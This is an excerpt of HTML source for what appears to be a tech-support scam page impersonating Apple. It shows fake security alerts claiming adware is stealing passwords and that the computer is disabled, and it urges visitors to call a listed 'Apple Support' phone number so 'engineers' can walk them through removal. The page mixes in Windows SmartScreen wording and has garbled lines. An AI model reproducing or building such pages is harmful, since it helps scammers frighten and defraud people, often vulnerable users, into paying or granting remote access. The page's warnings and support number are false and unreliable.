...
<head>
  ...
  gtag('config', 'UA-232668117-1');
    ...
    <title>Security Code Er#0x268d3 </title>
 ...
 (Apple Helpline)</span></span>
        ...
        <div class="col-md-12">
            <marquee width="100%" direction="left" height="100px"><small class="text-left"
                                                                         style="color: #eee;font-size: 10px;">
                    Apple SmartScreen prevented an unrecognized app from stating. Running this app might put your PC
                    at risk. Apple Scan has found potentially unwanted Adware on this device that can steal
...
<div id="poptxt" class="lightbox">
    <div class="ilb top">
        <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span> Apple Security Center</span>
    ...
    <div id="disclaimer">
        ...
        <span class="support">Contact Apple Support: +1-808-215-3446
 (Apple Helpline)</span>
    </div>
    <div id="bottom">
...
<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
    ...
    margin-top: 8px;">Apple - Security Warning</p>
    ...
    <p>Apple Scan has found potentially unwanted Adware on this device that can steal your passwords, online
    ...
    <p>You must contact us immediately so that our engineers can walk you through the removal process over the
        phone.</p>
    <p>Call Apple Support immediately to report this threat, prevent identity theft and unlock access to this
        device.</p>
...
<div id="welcomeDiv"
    ...
    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Do not restart or use
        your computer.<br>Your computer is disabled. Please call me.<br>Access is the block security reason for this
